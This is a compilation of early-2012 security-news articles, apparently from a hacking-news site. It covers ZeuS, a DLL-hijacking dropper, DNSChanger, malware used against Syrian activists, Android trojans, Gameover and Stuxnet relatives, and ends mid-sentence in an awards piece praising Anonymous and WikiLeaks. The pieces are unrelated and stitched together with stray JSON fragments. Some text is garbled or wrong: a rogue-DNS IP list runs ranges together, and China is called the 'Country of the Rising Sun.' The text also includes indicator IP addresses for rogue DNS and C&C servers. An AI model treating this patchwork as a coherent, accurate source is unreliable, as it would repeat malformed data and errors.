ZeuS is very popular in the cybercriminal world because it's capable of stealing a wide variety of information, documents and login credentials from infected systems. For many years it was the weapon of choice for most fraudsters targeting online banking systems.The Trojan's source code was published on Internet underground forums last year, paving the way for many third-party modifications and improvements. Previously, P2P was used to communicate between bots any change in the C&C server's URL. Other techniques have also been used, such as programmatically determining the URLs to be used on particular dates in the event that a bot loses contact completely. However, a new variant recently detected by antivirus vendor Symantec has completely removed the need for C&C servers. \"Every peer in the botnet can act as a C&C server, while none of them really are one,\" Symantec researcher Andrea Lelli said in a blog post Wednesday. Other changes noted by Symantec include a greater use of UDP instead of TCP to make it harder to track and dump data exchanges, and alterations to the compression and encryption used. In addition, the Zeus bot has been found distributing additional malware. \"Bots are now capable of downloading commands, configuration files, and executables from other bots -- every compromised computer is capable of providing data to the other bots,\" she said. \"Zeustracker is a site which has had considerable success in tracking and publishing IP block lists for Zeus C&C servers around the world,\" Lelli said, adding that Zeus' switch to P2P for these functions means that the site would no longer be able to produce exact Zeus C&C IP block lists. Law enforcement has been able to take down botnets in the past by shutting down the C&C servers. However, with a P2P network architecture, a botnet can avoid this single point of vulnerability.

Many of the recent files are malicious in nature, causing the infected user at the very worst, to lose everything on their computer. There are few specially coded malware, which are not only developed to ensure that they cause maximum damage and steal all the sensitive information they can find on the infected devices. According to Bitdefender experts, In a blog post they mention about such a malware called \"Dropper\" or Trojan.Dropper.UAJ. But the brand new in terms of approach that dropper hijacks a library file called comres.dll, altering it to ensure that each time it’s being used, the malware steps into play. The smartness of this malware can be judge from here that, it makes a copy of the genuine comres.dll file, patches it and then saves it in the Windows directory folder, where the operating system normally looks for a DLL to load when it is required. This attack unites two type of exploitation. DLL Hijacking is an attack that exploits the way some Windows applications search and load Dynamic Link Libraries. A bad guy can place a fake DLL for a known program in a location that is searched before the real DLL’s location and almost guarantee that the malicious DLL is loaded, resulting in whatever code the attacker wants to run running. The Trojan then drops a Backdoor, identified by Bitdefender as Backdoor.Zxshell.B, which actually contains the code compromising the system. Trojan.Dropper.UAJ is able to run on Windows7, Windows Vista, Windows 2003, Windows 2000 or Windows NT in both 32- and 64-bit environments. 2012 in terms of malware will be one of explosive growth, mostly because of the spread and growing allure of social networks and Security issues of the Android platform will mean that the number of threats to smartphones and tablets will also experience a boost in 2012.

Mobile malware hit more than 400 unique samples in Q4, up from over 100 in the third quarter, and less than 50 samples in the first quarter of last year. McAfee also found that PC malware counts declined during Q4, and were lower than in Q4 of 2010. Even so, the total number of unique malware samples is more than 75 million as of Q4, the report says. “On a global basis, we are conducting more of our personal and business transactions through mobile devices, and this is creating new security risks and challenges in how we safeguard our commercial and personal data,” said Vincent Weafer, senior vice-president of McAfee Labs. McAfee Labs recorded an average of 9,300 new bad websites per day in Q4, up from 6,500 in the previous quarter. The vast majority of new malicious sites were hosted in the US, followed by the Netherlands, Canada, South Korea and Germany. McAfee noted that both SQL injection and cross-site scripting attacks were increasingly observed over the quarter, while corporate espionage and hacktivist attacks also look set to climb in 2012.\"We saw some advances in cybercrime toolkits, as well as events that may have involved national governments,\" the company said in its report." }

Well ! Our job is to aware you about the Internet Security. If we are looking for some extra attention from our Readers then its part of our small effort to make Internet more secure space for all. Today we are going to Explain all about DNSChanger Trojan, its Impact on Internet users and the biggest challenge for FBI to resolve it, and How a non technical user can check and Restore its computer, Hope you will share this article with your Friends, Followers and On your Site to aware them about this Serial Internet Killer. What is DNS (Domain Name System) ? is an Internet service that converts user-friendly domain names into the numerical Internet protocol (IP) addresses that computers use to talk to each other. When you enter a domain name, such as www.thehackernews.com, in your web browser address bar, your computer contacts DNS servers to determine the IP address for the website. Your computer then uses this IP address to locate and connect to the website. DNS servers are operated by your Internet service provider (ISP) and are included in your computer’s network configuration. DNS and DNS Servers are a critical component of your computer’s operating environment without them, you would not be able to access websites, send e-mail, or use any other Internet services. What is DNSChanger ? a small file about 1.5 kilobytes , DNSChanger is a trojan that will change the infected system's Domain Name Server (DNS) settings, in order to divert traffic to unsolicited, and potentially illegal sites. This Trojan is designed to change the 'NameServer' Registry key value to a custom IP address. This IP address is usually encrypted in the body of a trojan. When ? The DNSChanger malware was first discovered around 2007, and since this time has infected millions of computers, around 500,000 of them being in the U.S., and through these computers the criminals have reportedly pulled in around $14 million in stolen funds. The FBI has uncovered a network of rogue DNS servers and has taken steps to disable it.The FBI is also undertaking an effort to identify and notify victims who have been impacted by the DNSChanger malware. Who are infected and Technical Info ? Both Windows and MacOS users are at risk for this infection because it exploits your browser, not your operating system.Here are some known hostile IP address pairs used by the DNS Changer malware: 64.28.176.1 - 64.28.191.25467.210.0.1 - 67.210.15.25477.67.83.1 - 77.67.83.25485.255.112.1 - 85.255.127.25493.188.160.1 - 93.188.167.254213.109.64.1 - 213.109.79.254 Why its not easy Remove this Trojan ? One consequence of disabling the rogue DNS network is that victims who rely on the rogue DNS network for DNS service could lose access to DNS services, So This Process will start on March 8 by FBI. Why 8th March 2012 ? After the take down of the DNSChange Botnet, in November 2011, the FBI obtained a court order allowing the FBI to set up a temporary DNSChanger Command & Control network. The court order expires on March 8th, 2012. Unless the FBI obtains a new court order allowing them to continue operating the temporary network, the network will be turned off. Resulting in millions of computers, world-wide, no longer being able to access the Internet. How to check manually that your System is Infected or Not ? The best way to determine if your computer has been affected by DNSChanger is to have them evaluated by a computer professional. Avira cooperated also with the German Federal Office for Information Security (BSI) and published the tool also on the special website created to check if the DNS requests are made to the right places: www.DNS-OK.de. Besides the website, users can also OK DNS, the DNS-repair tool from the Avira website to download here. After 8th March all computer will be Secured ? According to FBI, It is quite possible that computers infected with this malware may also be infected with other malware. The establishment of these clean DNS servers does not guarantee that the computers are safe from other malware. The main intent is to ensure users do not lose DNS service." }

Last year, authorities in Estonia apprehended six men believed responsible for creating a malicious computer script called the DNSChanger Trojan. Once set loose on the Web, the worm corrupted computers in upwards of 100 countries, including an estimated 500,000 in America alone. Must Read : FAQ : DNSChanger Trojan, Impact and Solutions The primary impact of this infection is that it caused web surfers to be sent to fraudulent websites by changing what is called the DNS settings on compromised computers.The Domain Name System (DNS) is the backbone of the Internet's address scheme and DNS servers are special computers around the world that act as Internet traffic cops providing directions to websites that you wish to visit. Though the FBI has shut down the DNSChanger network and put up surrogate servers, they warned the solution was only temporary - and the court-ordered deadline is March 8. When the FBI pinched this group, if they had shut down the rogue DNS servers, everyone that was infected would have instantly been cut off from the Internet so the FBI chose a different strategy.They decided to get a court order allowing them to replace the rogue DNS servers with legitimate stand-ins so that all the infected computers wouldn't get cut off without warning giving them time to get the word out. Both Windows and MacOS users are at risk for this infection because it exploits your browser, not your operating system. If you are somewhat technical, you can do a self-check of your computer to make sure you're not infected by comparing your computer's DNS setting to the list of rogue DNS servers: 85.255.112.0 through 85.255.127.255 67.210.0.0 through 67.210.15.255 93.188.160.0 through 93.188.167.255 77.67.83.0 through 77.67.83.255 213.109.64.0 through 213.109.79.255 64.28.176.0 through 64.28.191.25 The FBI has published a pretty decent guide to performing the self-check here.

They steal the identities of opposition activists, then impersonate them in online chats, then they gain the trust of other users, pass out Trojan horse viruses and encourage people to open them. Security Researcher in the Malware Detection Team (MDT) at Norman analyse the packages and found that there are two malicious programs, one which displays message about downloading a free security program, and one which showed no action when executed. He said that Most of the ones we’ve seen come as selfextracting RAR executables that extract a malicious program. The malicious programs have been Visual Basic executables that primarily are downloaders and keyloggers they download an encrypted update from a site in Syria (216.6.0.28).

Once on the victim's computer, the malware sends information out to third parties. Vikram Thakur, principal security response manager at Symantec Corporation has dubbed the simpler virus \"backdoor.breut.\" - It was the more complex virus that the former aid worker unwittingly downloaded during a chat. Backdoor.breut attempts to give the hacker remote control of the victim's computer, according to the analysis. It steals passwords and system information, downloads new programs, guides internal processes, logs keystrokes and takes shots with the webcam. This virus sends the information it pillages from infected computers to the IP address: 216.6.0.28 . \"We checked the IP address that our engineer referenced and can confirm that it belongs to the STE (Syrian Telecommunications Establishment),\" a Symantec representative wrote to CNN.

When you are on the web the best thing that you can do is to go with your instincts. In real life, when we walk around, we usually go with our gut to make sure that we stay out of danger. If something does not seem right we usually “sense” it for lack of a better term. This is not something that is new. This is how we survived in the wilderness all of those many years ago. We made sure that we stayed safe by following our instincts and doing the right thing. All of these years later and that same advice still holds up to be true. But like we said in the previous paragraph, you have to worry about following your instincts when you are on the web as well. There are many different kinds of pitfalls that you can encounter when you are on the web. It doesn’t matter whether it is meeting the wrong type of person or it is downloading the wrong type of file. The dangers that you face on the web can go beyond virtual and can easily become something that you deal with in real life. What your instincts can help you avoidThere are several different types of malware that float around the internet on a daily basis. They just sit out there waiting for either you to discover them or for you to make a mistake and get caught downloading them. But do not make the mistake and think that all of the malwares out there are the same. No, they are all different. The ones that you can really avoid with the help of your gut are the ones that are delivered through social manipulation. People think that hackers are people who do not like to interact with others. That is only a stereotype and is not true at all. Most of the attacks that you see on the web are initiated by social interaction. While yes, most of the social interaction of these attacks is through the web it does not always stay that way. Some of these attacks are schemes to try and get you to give up money or information. This means that they will try and actually talk to you through the use of web cams or through the use of talk software such as Skype. If you are in the same area they will actually try to meet with you. This is called social hacking and it is something that is practiced all of the time. As a matter of fact, one of the most well known hackers of all time, Kevin Mitnick, biggest strength was his ability to social hack. But social hacks are not the only ones that you can avoid through the use of your gut. You can also avoid tech based hacks as well. You can do this by listening to your inner self when it comes to what links to click on and what files to download. If you are unsure about a click, then most of the time you should not do it. This is especially true if you are on a web site that you have never visited before. But even well known web sites can give you this feeling as well. If you are on a site like Facebook and the link that you see seems weird then do not click it. Listen to your gut and avoid all of the problems that not listening can bring. You do not have to be a computer genius to do a little computer security. Most of the problems that you run across can be avoided entirely by just doing a simple little thing like following your instincts.

This Malware is estimated to affect between 10,000 and 30,000 phones on any given day. The malware, mostly found on Chinese phones, works by using GingerBreak, a tool that gives users root access to Android 2.3 Gingerbread. RootSmart is designed to escape detection by being named \"com.google.android.smart,\" which the same name as a settings app included by default with Android operating systems. Mullaney explained that once the malware is installed on the Android phone, an outbound connection from the infected phone to a remote server is generated.“The malware posts some user and phone-specific data to the remote address and attempts to download and run an APK file from the server. The downloaded file is the second stage in the malware and is a Remote Administration Tool (RAT) for Android, detected as Android.Bmaster. This type of malware is used to remotely control a device by issuing commands from a remote server”. To counter the rising tide of threats, Google last week announced it had launched an app prescreening tool called Bouncer that runs a server-based simulation to check apps for malicious behavior such as attempts to access or send personal data, or simply send out pricey text messages. Google blocks them before they get into the official Android Market.Bouncer has been used quietly for several months; in the second half of 2011, the Android market saw a 40 percent decrease in malware apps identified as potentially malicious, compared to the first half of the year. Google spokesperson Nancarrow points out that Rootsmart wasn’t found in the official Android Market and so falls outside the zone of protection that Google is trying to enforce with its new malware scanner. And the fact that Gingerbreak was already patched, he adds, points to Android’s “defense in depth approach, not a reliance on any specific user protection measure.” Get one Best Security Product for your Android from above list, If you really love your Phone, Read Here." }

Read and decide for yourself : When we think of China in relation to cyber warfare, we imagine an army of hackers hired by the government in a computer room ready to successfully attack any potential target. China is perceived as a cyber power and ready to march against any insurmountable obstacle using any means. In this connection we read everything and its opposite, and we are ready to blame all sorts of cyber threat to the Country of the Rising Sun. The truth, however, is quite different, at least in my opinion, and understands that the Chinese people before others have understood the importance of a strategic hegemony in cyber space. However, many doubts are beginning to gather on the real technological capabilities of China. It certainly has a high potential for cyber offensive but its quality is really arguable. China has the most extensive cyber-warfare capabilities. It began to implement an Information Warfare strategy in 1995 conducting a huge quantity of exercises in which computer viruses have been used to interrupt military and private communications. In 2000, China established a strategic Information Warfare unit, Net Force, which is responsible for “wage combat through computer networks to manipulate enemy information systems spanning spare parts deliveries to fire control and guidance systems.” Today The PLA GSD Third Department and Fourth Departments are considered to be the two largest players in China‘s burgeoning cyber-infrastructure. In November 2011, Desmond Ball, a professor in the Strategic and Defense Studies Centre at Australia's National University argues that the Chinese offensive capabilities today are pretty limited and he has also declared that the internal security has a bunch of vulnerabilities. Ball says that China's cyber-warfare capabilities are \"fairly rudimentary\", and is actually able to organize massive attacks (e.g. DDoS attacks) with little sophistication. The technology solutions behind the malware used are really poor and this makes them really simple to detect and remove before any damage has been done or data stolen. The capabilities shown cannot be sufficient to penetrate highly secure networks or covertly steal or falsify critical data. Are we really sure that behind the attacks are China's hackers?According cyber analysts, hackers in China and their attacks have different digital fingerprints, easily recognizable by analyzing the used computer code, and studying the command and control computers that they used to move their malicious software. No doubt, analysts are convinced that attacks are coming from the Chinese government, because they have tracked enough intrusions to specific locations to be confident they are linked to Beijing cyber structures. Consider that the threat was persistent, spreading malware in target computer networks again and again over the course of several months or even years. http://www.securitychallenges.org.au/ArticlePDFs/vol7no2Ball.pdf Which are the countries being targeted by China and which are the real target of this attacks?Many cyber-intelligence operations have been conducted against numerous countries, including the United States, UK, Australia, New Zealand, Canada, Germany, France, the Netherlands, Portugal, Japan, South Korea, Taiwan, India, Pakistan, Iran, Thailand, the Philippines and Indonesia. Consider that according to what has been published in the Office of the National Counterintelligence Executive report, prevalent usage of cyber operations is related to attempting to gain business and industrial secrets from companies, in this case from Americans. http://www.ncix.gov/publications/reports/fecie_all/Foreign_Economic_Collection_2011.pdf Companies are frustrated that the government isn't doing enough to pressure China to stop the attacks which the Chinese government has officially been providing protection and anonymity to those groups of hackers.In the last ten years the attacks have increased dramatically broadened to target defense companies, critical industries, major firms also including critical infrastructure. China is considered one of the most dangerous players of cyber-espionage operations against world wide business. Forecast for the next years aren’t encouraging because the government of China will maintain an aggressive approach and be capable of collecting sensitive economic, military and industrial information related foreign Nations. To give you an idea of the huge quantity of attacks reported in 2011 for which China was directly or indirectly considered responsible I submit an interesting table prepared by the security expert Paolo Passeri. The list includes prominent victims such as RSA. Obviously we do not have total certainty on the array of attacks, but the evidence suggests that behind all of these operations there is a single performer, China. Just last week Julian Assange has declared that Chinese intelligence penetrated into the intelligence system of the Indian government including the Indian equivalent of FBI, the Central Bureau of Investigation. This event brings to the fore the need for governments to have an appropriate cyber strategy so that National Security cannot be affected by such attacks. The economic development of a nation can no longer ignore these cyber attacks regardless of its awareness of the cyber threat. http://ibnlive.in.com/news/china-hacked-indias-intel-network-assange/208460-3.html Based on the above facts, I believe it is wrong to consider these attacks rudimentary as the effects demonstrate that they are really dangerous and efficient. Another erroneous belief is that the Chinese government uses a large group of hackers to make the attack. According to a report supplied by the Associated Press the majority of the attacks emanating from China are conducted by a few as a dozen groups of hackers under the control and coordination of the Chinese government. What is the economic impact of cyber attacks on the U.S.?Considering a report recently released by the United States Office of the Counterintelligence Executive (ONCIX) several billions of dollars are lost in intellectual property and classified information disclosure every year due cyber espionage. http://www.ncix.gov/publications/reports/fecie_all/Foreign_Economic_Collection_2011.pdf We are warned that the constant barrage of cyber attacks against economic and critical systems will require a unified effort by government and the private sector to improve security following a well defined cyber strategy addressed by the central Governments. Cyber warfare has just begun, stay sharp. [Cross Post from Securityaffairs]" }

File-storage services offer several advantages for cybercriminals. SendSpace accepts files and then generates a link that can be shared with other people to download the content in the files. The malware has been configured to send files, copy the download link and send it to a command-and-control server along with the password needed to access the archive, Dela Paz wrote. Here is a screenshot of the Sendspace page leading to the archive of collected documents. Malware utilizing free online services are definitely not unheard of. Utilizing a public file hosting site is yet another clever way for cybercriminals to store stolen data as they do not need to set up a server that will store large amount of data.The services are especially useful for so-called Advance Persistent Threat attacks, where cyberspies seek to infiltrate an organization for a long period of time, said Rik Ferguson, director of security research and communication for Trend Micro in Europe." }

You can Download Here Special The Hacker News Magazine January 2012 Edition. Have a look the interesting Article shared by Lee : The one thing that is great about the internet is that just like many of the other major mediums it has content for all different types of age groups. If you have older people that you need to entertain then you will be able to find something for them to be entertained by on the web. If you have younger kids that you have to entertain then you will find something for them as well. But unlike the other major mediums such as TV, you have a more diverse stock from which to pick from. With the internet you are getting content from all around the world and no matter which age group you need to entertain, you will be able to find something for them to watch until their heart is content. Since the internet does have the ability to entertain children that means that there is a good chance that your child will want to use the computer all of the time. Just like in the 90’s when a parent would use the VCR and the TV as a baby sitter, they are now starting to do the same thing with a computer that is connected to the web. Instead of having to try to find activities to do to occupy the child's time they just sit them in front of the computer and let that content entertain them. But there is an inherent problem with this type of activity. Most parents these days have only been exposed to the internet for a small portion of their lives. This means that they have not grown up around the internet. This means that there is a good chance that they are unaware of the dangers that are on the net for children. Sure, they might have a general idea of what is dangerous on the internet - items such as viruses and other types of malware get the bulk of media attention - but what about the other types of dangers that can happen on the internet? How do you help protect your kids from that? Protecting your child from cyber danger If you’re going to allow your child to use the computer all of the time then you need to be aware of the dangers that are out there for them to face. You have to educate yourself in order to protect them. First of all, we will talk about the dangers such as malware that can affect them later in the article. For right now we will focus on the more dangerous threats of meeting strangers on the internet. Some people think that the only way that their child is going to meet up with a stranger is to wander into some adult chat room and talk to the wrong people. That is not true at all. There are more ways than that to meet up with strangers. There are adults who will take the time and stalk kid web sites and act like they are one of them. When they gain the kid's trust they will then try to set up a meeting. We don’t even have to express how bad that is.This is why you have to monitor what your kids are doing on the internet all of the time by using Parental Control Apps. Don’t give the bad guys a chance to strike. But getting back to malware, yes that is a problem for your kids as well. Having the wrong malware pop up can not only wreck your computer, but it can also cause your child to surf on web sites that are not meant to be for children’s eyes. So to keep this from happening you need to make sure that your child’s computer has the latest antivirus and other security tools. If your child is going to be on the computer for long periods of time then at least make sure they are safe." }

They reckoned Android.Counterclank, a slight variant of Android.Tonclank. Symantec explains that the malicious code appears in a package called “apperhand”, and a service under the same name can been seen running on the infected device when it’s executed. According to Symantec, the Trojan has been identified in 13 different apps in the Android Marketplace.Symantec’s Security Response Team Director, Kevin Haley said:“They don’t appear to be real publishers. There aren’t rebundled apps, as we’ve seen so many times before.” Symantec also noted that this slimy piece of malware has the highest distribution of any malware identified so far this year and may actually be the largest malware infection seen by Android users in the operating systems short life. The malware is actually a Trojan that attacks Android smartphones. Upon installation, it collects a wide scope of data, including the handset maker and bookmark copies. Moreover, it modifies the home page of the browser. As a result, hackers have earned some money from the malware by pushing some unwanted advertisements on the compromised Android devices.One of the reasons why the malware has affected such a huge number of Android users is because they do not bother reading privacy agreements. They simply approve these apps, without even reading information on them. Symantec stated it had notified Google of the apps hiding malicious code. However, many of the infected entries were still available on the Android Market as of Friday afternoon. For removal of the malware, Symantec is advising smartphone users to uninstall the infected applications and run a mobile antivirus program. It’s time Google started taking security much more seriously." }

Authors are Jesse Varsalone, Matthew Mcfadden, Michael Schearer and Sean Morrissey. \"If there ever was a book that should not be judged by its title, Defense against the Black Arts: How Hackers Do What They Do and How to Protect against It, is that book. Even if one uses the definition in The New Hackers Dictionary of 'a collection of arcane, unpublished, and (by implication) mostly ad-hoc techniques developed for a particular application or systems area', that really does not describe this book. The truth is that hacking is none of the above. If anything, it is a process that is far from mysterious, but rather aether to describe. With that, the book does a good job of providing the reader with the information needed to run a large set of hacking tools.\" Ben's review. Defense against the Black Arts is another in the line of hacking overview books that started with the first edition of Hacking Exposed. Like Hacking Exposed, the book walks the reader through the process of how to use hacking tools and how to make sense of their output. Defense against the Black Arts is written for the reader with a good technical background who is looking for a nuts and bolts approach to ethical hacking. Its 14 chapters provide a comprehensive overview of the topic, with an emphasis on Windows. But for those looking for an introductory text, this is not the best choice out there. The book is written for the reader that needs little hand-holding. This is in part due to its somewhat rough around the edges text and the use of more advanced hacking tools and techniques. By page 4, the author has the reader downloading BackTrack Linux. BackTrack is a Ubuntu distro which has a focus on digital forensics and penetration testing. BackTrack is currently in a 5 R1 release, based on Ubuntu 10.04 LTS and Linux kernel 2.6.39.4. BackTrack comes with a significant amount of security and hacking tools preloaded, which the authors reference throughout the book. After showing how to install BackTrack, chapter 1 shows how to log into Windows without knowing the password. Much of that is around the Kon-Boot tool, which allows you to change the contents of the Windows kernel in order to bypass the administrator password. Tools like Kon-Boot though will only work when you have physical access to the machine. Chapter 3 gets into the details of digital forensics and highlights a number of popular tools for forensic imaging. While the book provides a good overview of the topic, those looking for the definitive text on the topic should read Digital Evidence and Computer Crime: Forensic Science, Computers and the Internet. Chapter 5 deals with web application penetration testing. The authors describe a number of tools that can be used to assess the security of web sites, and offer ways to attempts to manipulate data from a web page or web application. One is likely hard pressed to find a large web site that will be vulnerable to such web attacks, given that most of them have already checked for those errors via validation control testing. Smaller vendors may not be so proactive, and find out that those $99- items are being sold for .99 cents. With that, the chapter details a number of tools developers can use to test for SQL injection, XSS and other types of web vulnerabilities. Chapter 8 is about capturing network traffic. There are two perspective to collecting traffic. For the attacker, it is about identifying holes and avenues for attack. For those trying to secure a network, collecting network traffic is an exercise in identifying, thwarting and defending the network against attacks. Chapter 10 provides a brief overview of Metasploit. For those looking for a comprehensive overview of Metasploit, Metasploit: The Penetration Testers Guide is an excellent resource. This chapter like many of the others provides the reader with detailed step-by-step instructions, including screen prints, on how to use the specific tool at hand. Chapter 11 provides a long list of attack and defense tools that can be used as a larger part of a penetration tester's toolkit. Chapter 12 is interesting is that it details how social engineering can be used. The authors show how public domain tools like Google Maps can be used in to mount an attack. Chapter 13 – Hack the Macs– is one of the shorter chapters in the book and should really be longer. One of the reasons pen testers are increasingly using Macs is that the newer Macs run on the Intel platform, and can run and emulate Windows and Linux. The increasing number of tools for the Mac, and significant Mac vulnerabilities, mean that the Mac will increasingly be used and abused in the future. Just last week, Dr. Mich Kabay wrote in Macintosh Malware Erupts that malware specifically designed for Mac is on the rise. This is based on progressively more and more serious malware for the Mac since 2009 where given that Apple products have been increasing their market share for laptops and workstations but especially for tablets and phones. The article notes that one of the reasons Mac OS X is perceived as superior to Windows is because of its appearance of having integrated security. But although the design may be sound, the operating system does not prevent people from being swayed into thinking that the malicious software they are downloading is safe. With that, Apple will have to concentrate more on security and vulnerability within their operating system. The book ends with about 30 pages on wireless hacking. The chapter provides an overview of some of the weaknesses in Wi-Fi technology and how they can be exploited. The chapter focuses on the airmon tool, part of BackTrack that you can use to set your wireless adapter into monitor mode, to see all of the traffic traversing the wireless network. Overall, Defense against the Black Arts: How Hackers Do What They Do and How to Protect against It is a really good reference for someone experienced in the topic who wants to improve their expertise.

Google has pulled 22 apps that are masquerading as legitimate versions of popular games like Angry Birds and Cut the Rope. Security researchers have discovered a way to bypass an Android smartphone owner's permissions and access private data stored on their smartphone. Avast Blog explain this as - For example, if someone tried to look for “Cut the rope free”, this malicious application was in the fourth place in the search results. Apps published by the developer Miriada Production may look like well known Android games (Angry birds, Need for speed, World of Goo and others) and users could be easily confused. The fake apps include \"Cut the Rope\", \"Need for Speed\", \"Assassins Creed\", \"Where's My Water? \",\"Riptide GP\", \"Great Little War Game\", \"World of Goo\", \"Angry Birds\", \"Shoot The Birds\", \"Talking Tom Cat 2\", \"Bag It!\" and \"Talking Larry the Bird\". The apps have been pulled from the Android Market. The fraudulent apps would install a premium rate SMS Trojan that would rack up hidden charges on the user's phone bill. The apps would lure customers into clicking on options that would send text messages to premium line numbers leaving the user to foot the bill. According to Lookout Mobile Security, the new threat called RuFraud has been found in an initial batch of apps on the Android Market that include horoscope apps, wallpapers, and game apps that pretend to be legitimate games like Angry Birds. What will happens if these threats are installed in your mobile devices? It will attempts to send text messages containing the string “798657” to premium-rate numbers using the infected device’s current default SMS Center (SMSC) by exploiting the Permissions function (android.permission.SEND_SMS), Capable of sending an affected user’s GPS location via HTTP POST, Opens several ports and connects to specific URLs to receive and execute commands from a remote user, Gathers information like International Mobile Equipment Identity (IMEI) and International Mobile Subscriber Identity (IMSI) numbers from infected systems, which is then sent to a specific site and Secretly forwards all incoming text messages to a remote user. How do users get these threats?Trend Micro has reported several incidents wherein malware came disguised as Android apps. Samples of Android malware found in the wild include:ANDROIDOS_DROIDSMS.A: Came disguised as Windows Media Player. ANDROIDOS_DROISNAKE.A: Came in the form of a game known as Tap Snake. ANDROIDOS_GEINIMI.A: Came in the form of Trojanized apps hosted in certain third-party app stores in China. ANDROIDOS_ADRD.A: Comes in the form of a Trojanized wallpaper app. ANDROIDOS_LOTOOR.A: Trend Micro’s detection for Trojanized versions of legitimate apps like “Falling Down”. ANDROIDOS_BGSERV.A: Trojanized version of Android Market Security Tool, which was released to address the modifications done by AndroidOS_LOTOOR.A. Trend Micro Suggest \"Users can also check the developer’s profile for other apps. Google also offers developer ratings, as well as the status 'Editor’s Choice' that can further validate the developer’s legitimacy. It is also a good practice to check app ratings and user feedback for more verification.

On Friday the FBI issued a warning about a banking trojan named Gameover. It’s a new variant of Zeus, a user credential stealing malware that targets online bank users. Zeus has been around for years, and every now and then a new version with a new twist pops up. Gameover has also been implicated in Distributed-Denial-of-Service attacks that temporarily-disable bank websites to draw attention away from fraudulent transactions. Like another Zeus variant, Troj/BredoZp-GY, Gameover uses e-mail spam to propagate, and the safest way to keep Gameover away from your PC is to avoid links and file attachments that are contained in unfamiliar e-mail messages. Experts warn that any interaction with this fake NACHA link can infect your PC with the Gameover banking Trojan, which will attempt to steal bank-related information while Gameover hides its own actions from site. Gameover Trojan it must be removed immediately to make your computer clean and safe. How do you avoid bank trojans? - ( from Norman Blog )Never, ever click on links (in email) that encourage you to “update your account information”, “check if your account has been compromised” or similar. Always, always login to your bank by typing the address in the browser url bar. Make sure your browser and operating system are always updated. Never, ever click “Later” when your browser or OS prompts you about a new security update. Keep you antivirus up to date. An advanced security solution will detect any harmful sites and block any malicious files, so that you don’t have to. Because Gameover and similar forms of banking Trojans are designed to conduct their attacks in a clandestine manner, you may not see much sign of Gameover on your PC, other than some anomalies in RAM usage or file processes. However, a successful Gameover infection can be the cause of :Loss of account login data and other forms of information that are used in bank-related websites. Loss of other forms of information that are gathered through keylogging (a broad form of spyware attack that monitors all types of keyboard input). Fraudulent transactions from your bank account due to abuse of any information that was stolen in the above attacks. DDoS (or Distributed-Denial-of-Service) attacks that crash your bank’s website to limit your access and conceal these transactions.

It's not just Stuxnet or DuQu , Kaspersky reveals 5 more cousins Russian computer security outfit Kaspersky Lab said that the Stuxnet virus that damaged Iran's nuclear programme was likely to be one of at least five cyber weapons developed on a single platform. The viruses have never been seen 'in the wild' - and it's unclear whether they, like Stuxnet, would be built to cause failures at nuclear plants, or engineered for another purpose. Both Stuxnet and Duqu appear to have been created back in late 2007 or early 2008, and other pieces of malware with similar capabilities were built on the same platform, Gostev said. Gostev examined two key drivers and variants that were used in both Stuxnet and Duqu, as well as two previously unknown drivers that were similar to the ones used. Not only did the same group of people develop Stuxnet and Duqu, but they likely worked simultaneously on multiple variants, Gostev said. The other pieces may be in the wild and not yet detected, or the developers may have decided not to release them, he said. Overall, Kaspersky found seven types of drivers from the family with similar characteristics, and for three of them there’s no knowledge of which malicious program they were used in conjunction with.Alexander Gostev, Chief Security Expert at Kaspersky, commented: “The drivers from the still unknown malicious programs cannot be attributed to activity of the Stuxnet and Duqu Trojans. The methods of dissemination of Stuxnet would have brought about a large number of infections with these drivers; and they can’t be attributed either to the more targeted Duqu Trojan due to the compilation date.” Researchers with Kaspersky have not found any new types of malware built on the Tilded platform, Raiu said, but they are fairly certain that they exist because shared components of Stuxnet and Duqu appear to be searching for their kin.When a machine becomes infected with Duqu or Stuxnet, the programs search for two unique registry keys on the PC linked to Duqu and Stuxnet that are then used to load the main piece of malware onto the computer, he said. \"We believe Duqu and Stuxnet were simultaneous projects supported by the same team of developers,\" Gostev wrote.The developers are tweaking ready-made files instead of creating new drivers from scratch, which allows them to make as many different driver files as they like, each having exactly the same functionality and creation date, Gostev said. These files can also be signed with legitimate digital certificates and packaged into different variants." }

Clicking the play button loads a “share” box allowing you to spread the scam message to your friends. The following survey scam also loads another Scam as shown below. Scams like this often use multiple domains, so you may see a variation in the landing pages and scam messages.These scams contain click-jacking and like-jacking components and ends in a survey scam. One of the most common types of Facebook spam is a Wall post that encourages you to install a Facebook application. The application will require that you to agree to allow the application to post on your Wall and your friend's Facebook pages. When you allow this authorization, the spam message is immediately sent to your friend's Walls. If a friend sees the message and performs the action, he or she will then see the same spam on their Wall and the cycle continues. This is how spam messages can move so quickly through Facebook. Unfortunately, many of these messages are designed to trick Facebook users into cutting and pasting malicious code into the address bar in the Web browser or by clicking an embedded link in the message that takes you off Facebook where you could potentially become victim to malicious malware and phishing scams.

Hacking has become much easier over the years, which is why 2011 had a lot of hacking for good and for bad. Hackers are coming up with tools as well as finding new methods for hacking faster then companies can increase their security. Every year there are always forward advancements in the tools and programs that can be used by the hackers. At the end of year 2011 we decided to give \"The Hacker News Awards 2011\". The Hacker News Awards will be an annual awards ceremony celebrating the achievements and failures of security researchers and the Hacking community. The THN Award is judged by a panel of respected security researchers and Editors at The Hacker News. Year 2011 came to an end following Operation Payback and Antisec, which targeted companies refusing to accept payments to WikiLeak's, such as, Visa and Amazon. Those attacks were carried out by Anonymous & Lulzsec. This year corporations, international agencies, and governments are now experiencing a flood of what is called Advanced Persistent Threats. APTs refer to a group of well-funded, highly capable hackers pursuing a specific agenda, often organized by a nation or State. Sony somehow pissed off the hacking group LulzSec, which downloaded information for millions of users, while posting to Sony's system: \"LulzSec was here you sexy bastards! Stupid Sony, so very stupid.\" The Hacker News Awards Categories & Winners 1.) Person of the Year : Julian Paul Assange He is, of course, the lean, tall, and pale 39-year-old Australian master hacker at the white-hot center of the whistle-blowing website WikiLeaks and, after revealing thousands of secret Afghan battlefield reports this week, the subject of investigation by U.S. authorities. 2011 could also be called the “Age of WikiLeaks”. Assange described himself in a private conversation as \"the heart and soul of this organisation, its founder, philosopher, spokesperson, original coder, organizer, financier, and all the rest\". Wikileaks celebrate its 5th Birthday on 4th October 2011, for being only 5 years old they have done a remarkable and outstanding job of serving the people. The one thing most governments in the world have left off their agenda’s. Keep up the good work Wikileaks and we stand in support and behind you. 2.) Best Hacking Group of the Year 2011 : ANONYMOUS DECK THE HALLS AND BATTON DOWN THE SECURITY SYSTEMS…..THEY AIN’T GOIN AWAY!Anonymous hackers have gained world wide attention because of their hacktivism. Anonymous is not an organization. Anonymous has no leaders, no gurus, no 